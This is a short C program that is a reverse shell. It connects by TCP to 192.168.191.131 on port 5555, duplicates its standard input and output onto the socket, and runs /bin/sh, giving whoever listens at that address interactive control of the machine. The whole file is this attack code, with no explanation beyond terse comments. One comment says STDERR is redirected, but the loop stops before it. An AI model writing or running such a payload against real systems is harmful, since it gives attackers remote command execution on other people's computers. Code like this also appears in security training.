#include<stdio.h>
#include<sys/types.h>
#include<sys/socket.h>
#include<netinet/in.h>
#include<stdint.h>

int main()
{
	uint32_t sockid;			//socket descriptor
	struct sockaddr_in srv_addr;		//client address
	uint32_t i;				//counter

	srv_addr.sin_family = AF_INET;
	srv_addr.sin_port = htons(5555);
	srv_addr.sin_addr.s_addr = inet_addr("192.168.191.131");

	//create socket
	sockid = socket(PF_INET, SOCK_STREAM, 0);

	//connect socket
	connect(sockid, (struct sockaddr *)&srv_addr, sizeof(srv_addr));

	//duplicate file descriptors for STDIN, STDOUT, STDERROR
	for (i=0; i<2; i++)
		dup2(sockid, i);

	//execute /bin/sh
	execve("/bin/sh", NULL, NULL);
	close(sockid);

	return 0;
}
